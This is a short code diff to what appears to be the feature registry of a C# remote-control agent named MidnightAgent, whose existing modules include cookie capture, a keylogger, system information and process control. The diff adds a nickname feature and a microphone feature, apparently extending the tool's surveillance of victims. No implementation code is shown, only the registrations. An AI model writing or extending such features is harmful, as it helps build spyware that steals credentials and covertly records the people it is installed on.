@@ -14,6 +14,7 @@ namespace MidnightAgent.Features
                 new HelpFeature(),
                 new JobFeature(),
                 new MenuFeature(),
+                new NickFeature(), // 🏷️ Nickname Support
 
                 // System & Info
                 new SystemInfoFeature(),
@@ -32,6 +33,7 @@ namespace MidnightAgent.Features
                 new CookieFeature(),
                 new KeyloggerFeature(),
                 new SearchFeature(),
+                new MicFeature(),
                 
                 // Process
                 new ProcessFeature(),
